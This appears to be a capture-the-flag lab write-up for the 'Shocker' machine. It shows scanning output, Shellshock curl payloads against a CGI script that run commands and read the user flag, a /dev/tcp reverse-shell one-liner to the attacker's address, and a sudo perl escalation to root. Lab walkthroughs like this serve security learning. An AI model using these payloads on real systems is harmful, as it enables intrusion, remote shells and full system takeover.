# Shocker

![image](https://user-images.githubusercontent.com/5285547/124322481-6e1e4200-db77-11eb-9e65-04c366f56e6c.png)

# Nmap 

```
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Running dirb tool 
```
dirb http://10.10.10.56/  

http://10.10.10.56/cgi-bin/ (CODE:403|SIZE:294)                                                                  
http://10.10.10.56/index.html (CODE:200|SIZE:137) 
```

Noting the name of the box, I can tell this is going to be a shellshock vunerability with the cgi-bin directory its a given! 

- /cgi-bin/
```
gobuster dir -u http://10.10.10.56/cgi-bin/ -w  /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt    -t 30 -x .txt,.html,.php,.bk,.gz,.png,.sh -s 403,200

/user.sh              (Status: 200) [Size: 118]
```

## ShellShock

- Basic usage (Exploit)

ExploitDB paper: https://www.exploit-db.com/docs/48112

```
curl http://10.10.10.56/cgi-bin/user.sh -A "() { :;}; echo 'Content-Type: text/plain';echo; /bin/ls"
```
```
user.sh
```

- Lets get the user of the box in /home

```
curl http://10.10.10.56/cgi-bin/user.sh -A "() { :;}; echo 'Content-Type: text/plain';echo; /bin/ls /home"
```
```
shelly
```

We can get the user flag now then work on getting on the box properly via a reverse shell 

```
curl -v http://10.10.10.56/cgi-bin/user.sh -A "() { :;}; echo 'Content-Type: text/plain';echo; /bin/cat /home/shelly/user.txt"
```

- Flag
```
beb558c0c6{REDACTED}a1ce663157
```

## Reverse Shell

```
curl -v http://10.10.10.56/cgi-bin/user.sh -A "() { :;}; echo 'Content-Type: text/plain';echo; /bin/sh -i >& /dev/tcp/10.10.14.184/9999 0>&1"
```
```
stty raw -echo;fg
reset
xterm
export TERM=xterm
export SHELL=bash
```

- Looking around the system you quickly find sudo -l has a good esculation route

```
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```

## Root

- GTFOBins  

![image](https://user-images.githubusercontent.com/5285547/124326697-c4db4a00-db7e-11eb-9ce2-0f01ae33dc46.png)


```
sudo perl -e 'exec "/bin/sh";'
```

- Now we are root and can get the last flag.txt in /root

![image](https://user-images.githubusercontent.com/5285547/124326767-eccaad80-db7e-11eb-8b39-0bd25d522af8.png)


- Flag
```
f011efb96{REDACTED}a7f7284ceea
```

